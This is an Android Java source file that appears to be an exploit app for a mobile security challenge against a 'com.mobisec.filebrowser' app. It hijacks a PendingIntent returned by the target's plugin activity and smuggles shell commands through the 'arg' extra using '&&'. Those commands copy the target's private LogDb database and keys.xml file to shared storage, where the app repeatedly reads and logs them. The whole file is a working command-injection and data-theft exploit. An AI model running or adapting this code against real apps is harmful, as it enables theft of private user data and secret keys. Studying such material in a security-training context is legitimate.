package com.mobisec.plaku.filebrowser_pi;

import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Intent;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.Arrays;
import java.util.Timer;
import java.util.TimerTask;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        try {
            Intent intent = new Intent();
//        intent.setComponent(new ComponentName("com.mobisec.filebrowser","com.mobisec.filebrowser.PluginActivity"));
            intent.setAction("com.mobisec.browser.action.START_PLUGIN");
            startActivityForResult(intent, 401);
        } catch (Exception e){
            Log.d("MOBISEC", Log.getStackTraceString(e));

        }

    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        // Check which request we're responding to
        Log.d("MOBISEC", "onActivityResult");
        if (requestCode == 401) {

            Bundle bundle = data.getExtras();
            if (bundle != null) {
                for (String key : bundle.keySet()) {
                    Log.e("MOBISEC", key + " : " + (bundle.get(key) != null ? bundle.get(key) : "NULL"));
                    if(key.equals("pi")){
                        PendingIntent pi = (PendingIntent) bundle.get(key);
                        Log.d("MOBISEC", pi.toString());
                        try {
                            Intent intent =
                                    new Intent()    // ls /data/data/com.mobisec.filebrowser/databases
                                            .putExtra("oper", "ls")
                                            .putExtra("arg", "/data/data/com.mobisec.filebrowser && cp /data/data/com.mobisec.filebrowser/databases/LogDb /sdcard/LogDb  && cp /data/data/com.mobisec.filebrowser/shared_prefs/keys.xml /sdcard/keys.xml")
                                            .putExtra("debug", true);
                            pi.send(getApplicationContext(), 0, intent);

                            Log.d("MOBISEC", "PI sent");

                            new Timer().scheduleAtFixedRate(new TimerTask() {
                                public void run() {
                                    byte[] log_file = readFile("/sdcard/LogDb");
                                    Log.d("MOBISEC", String.valueOf(log_file.length));
                                    String logs = new String(log_file);
                                    Log.d("MOBISEC", logs);

                                    String logsBytes = Arrays.toString(log_file);
                                    Log.d("MOBISEC", logsBytes);

                                    String db = new String(readFile("/sdcard/browser.log"));
                                    Log.d("MOBISEC", db);

                                    String keys = new String(readFile("/sdcard/keys.xml"));
                                    Log.d("MOBISEC", keys);

                                    try {
                                        Runtime.getRuntime().exec(new String[]{"sh", "-c", "cp /sdcard/LogDb /data/data/com.mobisec.plaku.filebrowser/databases/LogDb && cp /sdcard/keys.xml /data/data/com.mobisec.filebrowser/shared_prefs/keys.xml"});


                                    } catch (IOException e) {
                                        Log.d("MOBISEC", Log.getStackTraceString(e));
                                    }
                                }
                            }, 2000, 5000);

                        } catch (PendingIntent.CanceledException e) {
                            Log.d("MOBISEC", Log.getStackTraceString(e));
                            String logs = new String(readFile("/sdcard/browser.log"));
                            Log.d("MOBISEC", logs);
                        }
                    }
                }
            }
            // Make sure the request was successful
            if (resultCode == RESULT_OK) {
                Log.d("MOBISEC", "RequestCode 401, result OK");
            } else{
                Log.d("MOBISEC", "RequestCode 401, result not OK");
            }
        }
    }

    public byte[] readFile(String inputFileName) {
        File file = new File(inputFileName);
        if(!file.exists())
            return new byte[]{};
        byte[] result = new byte[((int) file.length())];
        InputStream input = null;
        int totalBytesRead = 0;
        try {
            InputStream input2 = new BufferedInputStream(new FileInputStream(file));
            while (totalBytesRead < result.length) {
                int bytesRead = input2.read(result, totalBytesRead, result.length - totalBytesRead);
                if (bytesRead > 0) {
                    totalBytesRead += bytesRead;
                }
            }
            input2.close();
        } catch (Exception e) {
            StringBuilder sb = new StringBuilder();
            sb.append("Exception while reading files:");
            sb.append(Log.getStackTraceString(e));
            Log.e("MOBISEC", sb.toString());
        } catch (Throwable th) {
            try {
                input.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
            throw th;
        }
        return result;
    }

}
